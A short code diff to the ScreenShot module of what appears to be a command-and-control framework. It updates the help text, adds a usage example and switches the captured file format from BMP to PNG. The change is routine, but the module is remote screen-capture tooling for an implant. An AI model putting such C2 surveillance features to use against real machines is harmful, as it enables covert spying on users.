@@ -55,9 +55,10 @@ std::string ScreenShot::getInfo()
     // TODO: add screenshot every x seconds with a recurringExec
 #ifdef BUILD_TEAMSERVER
     info += "ScreenShot:\n";
-    info += "Capture a screenshot and store it as a generated TeamServer artifact.\n";
+    info += "Capture a screenshot and store it as a generated PNG TeamServer artifact.\n";
     info += "exemple:\n";
     info += "- screenShot\n";
+    info += "- screenShot desktop.png\n";
 #endif
     return info;
 }
@@ -203,7 +204,7 @@ int ScreenShot::followUp(const C2Message &c2RetMessage)
 
     if(buffer.size()>0)
     {
-        std::string outputFile = "screenShot" + getFilenameTimestamp() + ".bmp";
+        std::string outputFile = "screenShot" + getFilenameTimestamp() + ".png";
         std::ofstream output(outputFile, std::ios::binary);
         output << buffer;
         output.close();
